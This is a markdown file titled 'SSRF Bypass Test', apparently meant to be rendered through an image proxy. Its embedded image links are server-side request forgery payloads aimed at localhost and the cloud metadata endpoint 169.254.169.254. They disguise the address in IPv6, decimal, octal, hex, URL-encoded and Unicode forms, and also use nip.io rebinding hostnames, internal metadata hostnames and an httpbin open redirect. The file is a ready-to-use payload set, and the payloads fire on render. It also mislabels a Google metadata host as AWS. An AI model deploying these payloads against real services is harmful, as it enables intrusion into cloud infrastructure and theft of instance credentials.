# SSRF Bypass Test

## IPv6 localhost
![ipv6](http://[::1]/test)
![ipv6-2](http://[0:0:0:0:0:0:0:1]/test)

## IPv6 mapped IPv4 for IMDS
![ipv6-imds](http://[::ffff:169.254.169.254]/latest/meta-data/)

## Decimal IP for IMDS (169.254.169.254 = 2852039166)
![decimal](http://2852039166/latest/meta-data/)

## Octal IP
![octal](http://0251.0376.0251.0376/)

## Hex IP
![hex](http://0xa9.0xfe.0xa9.0xfe/)

## URL encoding
![encoded](http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/)

## DNS rebinding (external domain resolving to internal)
![rebind](http://169.254.169.254.nip.io/latest/meta-data/)
![rebind2](http://169-254-169-254.nip.io/latest/meta-data/)

## AWS specific alternatives
![aws-magic](http://instance-data.ec2.internal/)
![aws-magic2](http://metadata.google.internal/)

## Redirect bypass (if camo follows redirects)
![redirect](https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/)

## Unicode bypass
![unicode](http://169。254。169。254/)
